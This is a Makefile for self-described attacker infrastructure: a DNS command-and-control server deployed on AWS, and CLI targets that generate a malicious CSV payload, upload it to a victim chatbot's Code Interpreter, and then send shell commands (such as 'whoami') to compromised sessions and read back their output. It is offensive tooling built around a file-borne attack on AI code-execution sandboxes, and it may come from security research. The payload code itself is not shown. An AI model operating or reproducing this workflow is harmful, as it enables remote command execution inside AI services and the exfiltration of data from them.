# Attacker Infrastructure Makefile
# DNS C2 Server and Attack Tools
#
# This infrastructure is owned by the ATTACKER. It includes:
# - DNS C2 server (EC2) that receives callbacks from compromised targets
# - Attack tools for generating malicious payloads and interacting with sessions
#
# The attacker does NOT have access to victim's Code Interpreter.
# All interaction happens via the C2 server HTTP API.

# Load .env file if it exists
ifneq (,$(wildcard .env))
include .env
export
endif

# =============================================================================
# Setup
# =============================================================================

setup: venv
	./venv/bin/pip install -e .
	@echo ""
	@echo "Setup complete! Activate with: source venv/bin/activate"
	@echo "Then run: c2 --help"

venv:
	python3 -m venv venv
	./venv/bin/pip install --upgrade pip

# Generate .env from Terraform outputs
.env: terraform/.terraform
	@echo "# Generated from Terraform outputs" > .env
	@echo "EC2_IP=$$(cd terraform && terraform output -raw instance_public_ip)" >> .env
	@echo "EC2_INSTANCE_ID=$$(cd terraform && terraform output -raw instance_id)" >> .env
	@echo "DOMAIN=$$(cd terraform && terraform output -raw domain)" >> .env
	@echo "S3_BUCKET=$$(cd terraform && terraform output -raw s3_bucket)" >> .env
	@echo "Generated .env file"

# =============================================================================
# Terraform (C2 Infrastructure)
# =============================================================================

terraform-init:
	cd terraform && terraform init

terraform-plan:
	cd terraform && terraform plan

terraform-apply:
	cd terraform && terraform apply

terraform-destroy:
	cd terraform && terraform destroy

# Full deploy: init + plan + apply (auto-approve) + configure
deploy: terraform-init
	cd terraform && terraform plan && terraform apply -auto-approve
	$(MAKE) .env
	$(MAKE) configure-ec2
	@echo ""
	@echo "C2 Infrastructure deployed!"
	@echo ""
	@echo "Environment configured in .env"
	@echo "Run: source venv/bin/activate && c2 --help"

# Legacy alias
terraform-yolo: deploy

configure-ec2:
	@bash scripts/configure_ec2.sh

# =============================================================================
# C2 Commands (via Click CLI)
# =============================================================================

# Attack a target
# Usage: make attack TARGET=https://victim-chatbot.com
attack:
	@if [ -z "$(TARGET)" ]; then \
		echo "Usage: make attack TARGET=https://victim-chatbot.com"; \
		exit 1; \
	fi
	./venv/bin/c2 attack $(TARGET)

# Generate malicious CSV
generate-csv:
	./venv/bin/c2 generate-csv

# Send command to session
# Usage: make send CMD="whoami" SESSION=sess_abc123
send:
	@if [ -z "$(SESSION)" ] || [ -z "$(CMD)" ]; then \
		echo "Usage: make send CMD=\"whoami\" SESSION=sess_abc123"; \
		exit 1; \
	fi
	./venv/bin/c2 send "$(CMD)" -s $(SESSION)

# Receive output from session
# Usage: make receive SESSION=sess_abc123
receive:
	@if [ -z "$(SESSION)" ]; then \
		echo "Usage: make receive SESSION=sess_abc123"; \
		exit 1; \
	fi
	./venv/bin/c2 receive -s $(SESSION)

# Attach to session interactively
# Usage: make attach SESSION=sess_abc123
attach:
	@if [ -z "$(SESSION)" ]; then \
		echo ""; \
		echo "Usage: make attach SESSION=sess_abc123"; \
		echo ""; \
		echo "To get a session ID:"; \
		echo "  1. Run: make generate-csv"; \
		echo "  2. Upload the CSV to the victim chatbot"; \
		echo "  3. Use the session ID shown in generate-csv output"; \
		echo ""; \
		exit 1; \
	fi
	./venv/bin/c2 attach $(SESSION)

# Alias for backwards compatibility
operator: attach

# Check C2 server status
status:
	./venv/bin/c2 status

# =============================================================================
# C2 Server Management
# =============================================================================

# View C2 server logs (CloudWatch)
logs:
	@echo "Tailing DNS C2 server logs from CloudWatch..."
	@echo "Log Group: /aws/ec2/dns-c2-server"
	@echo ""
	@aws logs tail /aws/ec2/dns-c2-server --follow --region us-east-1

# Check DNS server status
check-dns:
	@bash scripts/check_dns_status.sh

# Upload updated DNS server to S3, then deploy and restart on EC2
update-dns:
	cd terraform && terraform apply -auto-approve -target=aws_s3_object.dns_server_with_api
	$(MAKE) configure-ec2

# =============================================================================
# Testing
# =============================================================================

test:
	./venv/bin/python -m pytest tests/ -v

# =============================================================================
# Cleanup
# =============================================================================

clean:
	rm -rf venv/
	rm -rf *.egg-info/
	rm -rf .eggs/
	rm -rf build/
	rm -rf dist/
	find . -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null || true
	rm -f .env

destroy: terraform-destroy clean

# =============================================================================
# Help
# =============================================================================

help:
	@echo ""
	@echo "DNS C2 Attacker Infrastructure"
	@echo "==============================="
	@echo ""
	@echo "Setup:"
	@echo "  make setup              Create venv and install c2 CLI"
	@echo "  make deploy             Deploy C2 infrastructure"
	@echo ""
	@echo "Attack Workflow:"
	@echo "  make generate-csv       Generate malicious CSV with payload"
	@echo "  make attack TARGET=url  Send CSV directly to victim chatbot"
	@echo "  make attach SESSION=x   Attach to session interactively"
	@echo ""
	@echo "Session Commands:"
	@echo "  make send CMD=x SESSION=x   Send command to session"
	@echo "  make receive SESSION=x      Get output from session"
	@echo "  make status                 Check C2 server connectivity"
	@echo ""
	@echo "C2 Management:"
	@echo "  make logs               View C2 server logs"
	@echo "  make check-dns          Check DNS server status"
	@echo "  make update-dns         Redeploy DNS server code"
	@echo ""
	@echo "Or use the CLI directly:"
	@echo "  c2 --help               Show all CLI commands"
	@echo ""

.PHONY: setup venv terraform-init terraform-plan terraform-apply terraform-destroy \
        deploy terraform-yolo configure-ec2 attack generate-csv send receive attach \
        operator status logs check-dns update-dns test clean destroy help
